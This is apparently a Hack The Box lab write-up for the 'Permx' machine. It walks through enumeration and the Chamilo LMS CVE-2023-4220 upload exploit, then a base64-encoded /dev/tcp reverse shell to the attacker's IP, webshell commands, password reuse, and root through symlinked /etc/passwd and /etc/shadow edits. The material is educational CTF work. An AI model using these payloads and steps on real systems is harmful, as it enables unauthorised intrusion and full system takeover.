# Permx CTF Write-up

## Introduction

In this write-up, we detail the steps taken to compromise the "Permx" box from htb, the lab was straightforward and very beginner friendly ,this is a writeup of how i exploited it

### Target Overview

- **Box Name:** Permx
- **Difficulty** Easy
- **IP Address:** 10.10.11.23
-

This write-up is intended for educational purposes and to provide insight into the methodology used during the penetration testing process.

## Enumeration

### Nmap Scan

To start the enumeration, i used rustscan to identify open ports and services running on the target machine.

```bash
rustscan -a -t 2000 permx.htb -- -sC -sV -oA nmap -Pn
Open 10.10.11.23:22
Open 10.10.11.23:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -sC -sV -oA nmap -Pn -vvv -p 22,80 10.10.11.23
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI=
|   256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI
80/tcp open  http    syn-ack Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Directory Enumeration

To find directories and files on the web server, I ran Gobuster. This tool helps to brute-force directories and files, which is handy for discovering hidden resources.

**Command:**

```bash
gobuster dir -u http://permx.htb/ -w /home/mofe/tools/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 16 -x php,txt,html,zip
===============================================================
[+] Url:                     http://permx.htb/
[+] Method:                  GET
[+] Threads:                 16
[+] Wordlist:                /home/mofe/tools/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 274]
/.php                 (Status: 403) [Size: 274]
/index.html           (Status: 200) [Size: 36182]
/contact.html         (Status: 200) [Size: 14753]
/about.html           (Status: 200) [Size: 20542]
/img                  (Status: 301) [Size: 304] [--> http://permx.htb/img/]
/css                  (Status: 301) [Size: 304] [--> http://permx.htb/css/]
/courses.html         (Status: 200) [Size: 22993]
/team.html            (Status: 200) [Size: 14806]
/lib                  (Status: 301) [Size: 304] [--> http://permx.htb/lib/]
/js                   (Status: 301) [Size: 303] [--> http://permx.htb/js/]
/404.html             (Status: 200) [Size: 10428]
```
going through the pages of permx.htb and proxying the traffic through burpsuite i didnt find any vulnerabilty i could exploit so moving ahead to subdomain enumeration

### Subdomain Enumeration with Wfuzz

For subdomain enumeration, I used Wfuzz to brute-force potential subdomains. This helped to find hidden or less obvious parts of the application that might be running on different subdomains.

**Command:**

```bash
 wfuzz -c -w /home/mofe/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.permx.htb" --hc 302  http://permx.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://permx.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload         
=====================================================================

000000001:   200        586 L    2466 W     36182 Ch    "www"           
000000477:   200        352 L    940 W      19347 Ch    "lms"       
Total time: 100.2279
Processed Requests: 4989
Filtered Requests: 4987
Requests/sec.: 49.77654
---
```

we were able to discover 2 submaoins www and lms, the only thing we need is lms
#### Adding Subdomain and Initial Exploitation

 Adding `lms.permx.htb` to Hosts File

First, I added the subdomain `lms.permx.htb` to my hosts file to access the application running on that subdomain.
After adding the subdomain, I navigated to http://lms.permx.htb and found a login form for Chamilo LMS.
![login chamilo](https://github.com/user-attachments/assets/181022bc-32a2-4e83-bd0d-6a5d9fb8bd6f)


I tried default credentials and tested for SQL injection/ other vulnerabilities, but didn’t have much luck. I then searched online for known exploits for Chamilo LMS.

Unable to get the version number, I decided to try various exploits that I found. Eventually, I came across an exploit that worked:
#### Vulnerability Overview: CVE-2023-4220

CVE-2023-4220 is a critical RCE vulnerability in Chamilo LMS that allows unauthenticated attackers to upload malicious files and execute arbitrary commands on the server.
## Proof of Concept: CVE-2023-4220

### PoC Tool

I used the PoC from the following GitHub repository to exploit CVE-2023-4220:
[Chamilo LMS Unauthenticated Big Upload RCE PoC](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc)

### Script Usage

The script requires the target URL with Chamilo's root path (e.g., `http://example.com/chamilo`, `http://example.com`, or `http://chamilo.example.com`) and an action to perform. It supports three actions:
- **scan**: Checks if the target is vulnerable.
- **webshell**: Creates a web shell for further exploitation.
- **revshell**: Opens a reverse shell directly.

 to check if the target is vulnerable:
```bash
python3 poc.py -u http://lms.permx.htb -a scan
[+] Target is likely vulnerable. Go ahead. [+]
```
i got a positive response indicating the webapp might be vulnerable
## Exploiting the Vulnerability

Since the web service was found to be vulnerable, I proceeded to exploit it by creating a web shell.

1. **Run the PoC Script**: I used the PoC tool to upload a web shell. The command was:
   ```bash
   python3 poc.py -u http://lms.permx.htb -a webshell
```
Enter the name of the webshell file that will be placed on the target server (default: webshell.php): bam
```
i was asked to chose a name for the webshell so i chose a random name "bam"

after that the websell was created and i was given the url to access it
```bash
[+] Upload successfull [+]
Webshell URL: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/bam.php?cmd=<command>
```
testing it the webshell works 
```
curl http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/bam.php?cmd=id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### Obtaining a Reverse Shell

To gain access to the system, I used the ncreated web shell to execute a reverse shell payload.

1. **Execute the Payload**: I crafted a `curl` command to send a base64-encoded payload to the web shell. The payload was decoded and executed via the web shell. The command used was:
   ```bash
   curl "http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/bam.php?cmd=echo+'YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yOS80NDQ0IDA%2bJjE%3d'+|base64+-d+|bash"
edit the base64 payload to your own ip adress
**Result**
```bash
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.11.23] 34924
bash: cannot set terminal process group (1192): Inappropriate ioctl for device
bash: no job control in this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ 
```
### Upgrading the Shell

Once I had a reverse shell, I upgraded it to a more stable interactive shell for better control.

1. **Upgrade Shell**: I used a Python one-liner to upgrade the shell to a more interactive and functional state:
   ```bash
   python -c 'import pty; pty.spawn("/bin/bash")'
Background Shell: To regain control over my terminal, I sent the shell to the background with Ctrl+Z.

Reattach and Fix Terminal: I then reattached the shell using fg and fixed the terminal settings:
```bash
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$  python3 -c 'import pty; pty.spawn("/bin/bash")'
<s$  python3 -c 'import pty; pty.spawn("/bin/bash")'                     
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ ^Z
zsh: suspended  nc -lnvp 4444
                                                                                                                                                                      
┌──(mofe㉿mofe)-[~]
└─$ stty raw -echo ; fg          
[1]  + continued  nc -lnvp 4444

<c/lib/javascript/bigupload/files$ export TERM=xterm                     
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ 
```
now we have a fully interactive shell
i being enumeration for privesc

---
after manually browsing through config files looking for creds or any other information i can leverage i decided it's time to download 
'linpeash.sh' onto the box
### Downloading linpeas.sh Using a Python Web Server

To transfer `linpeas.sh` from my local PC to the target machine, I used a Python web server. Here are the steps I followed:

1. **Start Python Web Server on Local PC**:
   On your local PC, navigate to the directory where `linpeas.sh` is located and start a Python HTTP server to serve the file:
   ```bash
   python3 -m http.server 8000```

Download linpeas.sh on Target Machine
```bash
wget http://<your-ip>:8000/linpeas.sh
```
Make the linpeas.sh script executable:
'chmod +x linpeas.sh' then run linpease.sh with './linpeas.sh'
### Privilege Escalation

After running `linpeas.sh` and reviewing the results, several items caught my attention:



- **Vhost Configuration Files**: The configuration files contained some email addresses that might be useful.
- ![intressant1](https://github.com/user-attachments/assets/0c7748d0-9df1-4e36-a3be-07e5e9cdbf00)    ![interassant2](https://github.com/user-attachments/assets/462a899c-e2ff-46d4-8bd8-b639d86bf3af)


- **FTP Credentials**: Found FTP credentials that could potentially be used for accessing files.
- ![ftpcreds](https://github.com/user-attachments/assets/701045cf-4944-4e03-8294-87e0bf3e341a)

- **MongoDB Link**: Discovered a link to MongoDB that might be leveraged for further access.
- **Database Password**: Identified a database password that could be useful for accessing services or further escalation.


I decided to follow the easier path of trying common passwords for known services:
![configpass](https://github.com/user-attachments/assets/e538fa1a-df49-46bd-8ab2-9f056223d77d)

1. **Attempting Password Reuse**:
   - **FTP Credentials**: Used the found FTP credentials to access the FTP service.
   - **Database Password**: Tried the database password for various services to check for password reuse.

2. **Successful Escalation**:
   - The database password worked for logging in via SSH, allowing me to access the `mtz` user account.

This approach enabled me to escalate privileges and gain access to the `mtz` user.
### Privilege Escalation to root

After logging in as the `mtz` user via SSH, the first step was to check which sudo commands could be run. The result showed that `mtz` had permission to run `/opt/acl.sh` with `sudo` without a password.


```bash
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

#### Analyzing `acl.sh`

The `acl.sh` script is as follows:

```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

#### Breakdown of `acl.sh` Script

- **Input Validation**:
  - The script expects three arguments: a username, permission, and target file.
  - It checks if the number of arguments is exactly three. If not, it exits with a usage message.

- **Target Path Validation**:
  - The script ensures the target file is within `/home/mtz/` and does not contain `..` (to prevent directory traversal).

- **File Check**:
  - It verifies that the target is a file. If it is not, the script exits with an error message.

- **Setting ACLs**:
  - The script uses `setfacl` to modify the access control list (ACL) of the target file, granting the specified user the specified permissions.
### Exploiting `acl.sh`

Given the script's functionality, it was possible to exploit it as follows:

1. **Create Symbolic Links**:
   - A symbolic link to the `/etc/passwd` and `/etc/shadow` files was created in `/home/mtz`. This allows modifying these critical files through ACL changes.

   ```bash
   ln -s /etc/passwd /home/mtz/passwd
   ln -s /etc/shadow /home/mtz/shadow
2. **Modify Permissions**:

- Use `/opt/acl.sh` to grant `mtz` write permissions to the symbolic links.

  ```bash
  sudo /opt/acl.sh mtz rwx /home/mtz/passwd
  sudo /opt/acl.sh mtz rwx /home/mtz/shadow
`
  ### Update `passwd` and `shadow` Files

- Edit the `/home/mtz/passwd` and `/home/mtz/shadow` files to add a new root user with a known password hash.generate your own
- password hash with openssl and if you want to use mine the pasword is 'naruto'

  ```bash
  echo 'chef:x:0:0:root:/root:/bin/bash' >> /home/mtz/passwd
  echo 'chef:$6$m.8UCPi1Mj9FRFMK$OR6ubVYKZzE9UFiGm4ahw0t680nd5m//Wj55/0apx9NjfyOML8bvTi19Bh7JfAEW0wm59BE5dp17VrKpu8UCI0:19742:0:99999:7:::' >> /home/mtz/shadow
`
switch to the new user 'chef' and youre root
i also wrote a script that does the escalation from mtz to root easily check the folder


